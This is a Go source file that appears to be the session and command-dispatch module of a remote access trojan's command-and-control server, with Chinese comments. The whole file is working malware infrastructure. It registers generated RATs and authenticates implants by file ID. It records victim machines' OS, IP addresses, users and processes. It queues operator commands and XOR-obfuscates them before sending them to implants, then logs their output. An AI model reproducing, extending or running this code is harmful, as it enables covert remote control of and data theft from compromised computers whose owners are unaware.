package CommandControl

import (
	"Server/Public"
	"encoding/json"
	"fmt"
	"github.com/gin-gonic/gin"
	"strconv"
	"sync"
	"time"
)

type Session struct {
	fidInfo     map[string]string                            // {fid: "", ...} RAT 的 FileId, 相当于凭证
	commandInfo map[string]map[string]map[string]interface{} // {sid: {commandId: info, ...}, ...} 准备向 RAT 会话发送的命令
	rwMutex     sync.RWMutex
}

var SessionObj = Session{
	fidInfo:     map[string]string{},
	commandInfo: map[string]map[string]map[string]interface{}{},
}

func (p *Session) CheckFid(fid string) bool {
	p.rwMutex.Lock()
	defer p.rwMutex.Unlock()
	_, exists := p.fidInfo[fid]
	if exists {
		return true
	}
	fidList := Public.SqlSelect("SELECT fid FROM RATInfo WHERE fid=?", fid)
	if len(fidList) > 0 {
		p.fidInfo[fid] = ""
		return true
	}
	return false
}

func (p *Session) AddCommand(username string, info map[string]interface{}) {
	p.rwMutex.Lock()
	defer p.rwMutex.Unlock()
	if (info["func"] == "ls" || info["func"] == "pwd") && info["re"] == "false" { // 查询历史命令输出
		commandIdList := Public.SqlSelect("SELECT id FROM CommandLog WHERE sid=? and func=? and paras=? ORDER BY id DESC LIMIT 1", info["sid"], info["func"], info["paras"])
		if len(commandIdList) > 0 {
			contentList := Public.SqlSelect("SELECT content, note FROM CommandLog WHERE commandId=?", commandIdList[0]["id"])
			if len(contentList) > 0 {
				Public.UserInfoObj.SendToUser(username, "outputInfo", map[string]string{"sid": info["sid"].(string), "content": contentList[0]["content"], "note": contentList[0]["note"]})
				return
			}
		}
	}
	if p.commandInfo[info["sid"].(string)] == nil {
		p.commandInfo[info["sid"].(string)] = map[string]map[string]interface{}{}
	}
	var id = ""
	if username != "C2 Server" {
		err := Public.SqlQueryRow("INSERT INTO CommandLog (time, username, sid, type, func, paras) VALUES (?, ?, ?, ?, ?, ?) RETURNING id", &id, time.Now().Format("2006.01.02 15:04:05"), username, info["sid"], info["type"], info["func"], info["paras"])
		if err != nil {
			Public.PrintLog("error", fmt.Sprintf("%s is unable to add command: %v\n%s", username, info, err.Error()))
			return
		}
	}
	info["username"] = username
	p.commandInfo[info["sid"].(string)][id] = info
}

// 将命令全部发送至 RAT 会话
func (p *Session) SendAllCommands(sid string, key []byte, c *gin.Context) {
	p.rwMutex.Lock()
	defer p.rwMutex.Unlock()
	commandInfo, err := json.Marshal(p.commandInfo[sid])
	if err != nil {
		Public.PrintLog("error", "Unable to send commands to sid "+sid+".\n"+err.Error())
		return
	}
	p.commandInfo[sid] = map[string]map[string]interface{}{}
	data := XorData(append(append(commandInfo, []byte{0x00}...), key...))
	c.Header("Content-Length", strconv.Itoa(len(data)))
	c.Data(200, "application/octet-stream", data)
}

func (p *Session) UpdateSessionInfo(sessionInfo map[string]interface{}) bool {
	// 通过 FID 检查 RAT 是否注册
	fid, exists := sessionInfo["fid"]
	if !exists {
		Public.PrintLog("warning", "Listener "+sessionInfo["listener"].(string)+" - Data excluding fid from "+sessionInfo["external"].(string)+".")
		return false
	}
	if !p.CheckFid(fid.(string)) {
		Public.PrintLog("warning", "Listener "+sessionInfo["listener"].(string)+" - Wrong fid from "+sessionInfo["external"].(string)+".")
		return false
	}
	// 更新 RAT 会话信息
	sessionInfoList := Public.SqlSelect("SELECT * FROM SessionInfo WHERE sid=?", sessionInfo["sid"])
	if len(sessionInfoList) > 0 {
		sessionInfo["setSID"] = false
		sessionInfoList[0]["user"] = sessionInfo["user"].(string)
		sessionInfoList[0]["sleep"] = sessionInfo["sleep"].(string)
		sessionInfoList[0]["pid"] = sessionInfo["pid"].(string)
		sessionInfoList[0]["hashInfo"] = sessionInfo["hashInfo"].(string) // 已加载的 ExeLite 的 Hash
		Public.UserInfoObj.SendToAllUsers(sessionInfo["sid"].(string), sessionInfoList[0])
		err := Public.SqlExec("UPDATE SessionInfo SET user=?, sleep=?, pid=?, hashInfo=? WHERE sid=?", sessionInfo["user"], sessionInfo["sleep"], sessionInfo["pid"], sessionInfo["hashInfo"], sessionInfo["sid"])
		if err != nil {
			Public.PrintLog("warning", fmt.Sprintf("Unable to update sessionInfo to the database.\nThe sessionInfo during the error:\n%v", sessionInfoList[0]))
		}
	} else {
		var sid string
		sessionInfo["setSID"] = true
		err := Public.SqlQueryRow("INSERT INTO SessionInfo (os, external, internal, listener, process, sleep, arch, fid, connectTime, hashInfo) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?) RETURNING sid", &sid, sessionInfo["os"], sessionInfo["external"], sessionInfo["internal"], sessionInfo["listener"], sessionInfo["process"], sessionInfo["sleep"], sessionInfo["arch"], sessionInfo["fid"], sessionInfo["connectTime"], sessionInfo["hashInfo"])
		if err != nil {
			Public.PrintLog("warning", fmt.Sprintf("Unable to update sessionInfo to the database.\nThe sessionInfo during the error:\n%v", sessionInfo))
			return false
		}
		sessionInfo["sid"] = sid
		sessionInfo["note"] = ""
		Public.UserInfoObj.SendToAllUsers(sid, sessionInfo)
		Public.PrintLog("success", fmt.Sprintf("New session: %v", sessionInfo))
	}
	return true
}

func (p *Session) IssueCommands(outputInfo map[string]map[string]interface{}, c *gin.Context) {
	// 解析 RAT 命令输出 outputInfo: {sessionInfo, commandId: info, ...}
	sessionInfo := outputInfo["sessionInfo"]
	for key, info := range outputInfo {
		if commandId, err := strconv.Atoi(key); err == nil {
			info["sid"] = sessionInfo["sid"].(string)
			Public.UserInfoObj.SendToUser(info["username"].(string), "outputInfo", info)
			err := Public.SqlExec("INSERT INTO CommandLog (time, username, sid, commandId, content, note) VALUES (?, ?, ?, ?, ?, ?)", time.Now().Format("2006.01.02 15:04:05"), info["username"], info["sid"], commandId, info["content"], info["note"])
			if err != nil {
				Public.PrintLog("error", fmt.Sprintf("Unable to update command output to the database.\nCommandId: %d %v\n%s", commandId, info, err.Error()))
			}
		}
	}
	// 下发命令
	if sessionInfo["setSID"].(bool) {
		p.AddCommand("C2 Server", map[string]interface{}{"sid": sessionInfo["sid"]})
	}
	p.SendAllCommands(sessionInfo["sid"].(string), sessionInfo["key"].([]byte), c)
}

func XorData(data []byte) []byte {
	dataLen := len(data)
	keyIndex := dataLen - 8 // data: 密文 + KEY(8位)
	for i := 0; i < dataLen-8; i++ {
		data[i] ^= data[keyIndex]
		keyIndex++
		if keyIndex == dataLen {
			keyIndex = dataLen - 8
		}
	}
	return data
}

// 生成 RAT 时进行注册, 与 RAT 交互时检查 FID 是否存在
func (p *Session) RegisterRAT(username string, paras map[string]interface{}) {
	profile, err := json.Marshal(paras)
	if err == nil {
		err = Public.SqlExec("INSERT INTO RATInfo (fid, profile, time) VALUES (?, ?, ?)", paras["fid"], profile, time.Now().Format("2006.01.02 15:04:05"))
		if err == nil {
			listenerInfoList := Public.SqlSelect("SELECT * FROM ListenerInfo WHERE name=?", paras["listener"])
			if len(listenerInfoList) > 0 {
				paras["listenerInfo"] = listenerInfoList[0]
				Public.UserInfoObj.SendToUser(username, "ratInfo", paras)
			}
		}
	}
	if err != nil {
		Public.PrintLog("warning", "Unable to register RAT.\n"+err.Error())
	}
}

func (p *Session) UpdateSessionNote(username string, paras map[string]interface{}) {
	err := Public.SqlExec("UPDATE SessionInfo SET note=? WHERE sid=?", paras["note"], paras["sid"])
	if err == nil {
		Public.PrintLog("success", username+" has changed the note of the session "+paras["sid"].(string)+".")
	}
}

func (p *Session) DeleteSessionInfo(username string, paras map[string]interface{}) {
	err := Public.SqlExec("DELETE FROM SessionInfo WHERE sid=?", paras["sid"])
	if err == nil {
		Public.PrintLog("success", username+" delete the session "+paras["sid"].(string)+".")
	}
}

func (p *Session) GetTerminalContent(username string, paras map[string]interface{}) {
	contentList := Public.SqlSelect("SELECT content FROM TerminalInfo WHERE username=? and sid=?", username, paras["sid"])
	if len(contentList) > 0 {
		Public.UserInfoObj.SendToUser(username, "terminalContent", map[string]string{"sid": paras["sid"].(string), "content": contentList[0]["content"]})
	}
}

func (p *Session) UpdateTerminalInfo(username string, paras map[string]interface{}) {
	var err error
	contentList := Public.SqlSelect("SELECT content FROM TerminalInfo WHERE username=? and sid=?", username, paras["sid"])
	if len(contentList) > 0 {
		err = Public.SqlExec("UPDATE TerminalInfo SET content=? WHERE username=? and sid=?", contentList[0]["content"]+paras["content"].(string), username, paras["sid"])
	} else {
		err = Public.SqlExec("INSERT INTO TerminalInfo (username, sid, content) VALUES (?, ?, ?)", username, paras["sid"], paras["content"])
	}
	if err != nil {
		Public.PrintLog("error", fmt.Sprintf("Unable to update %s's terminal content to the database for session %s.\nContent: %s\n%s", username, paras["sid"].(string), paras["content"].(string), err.Error()))
	}
}
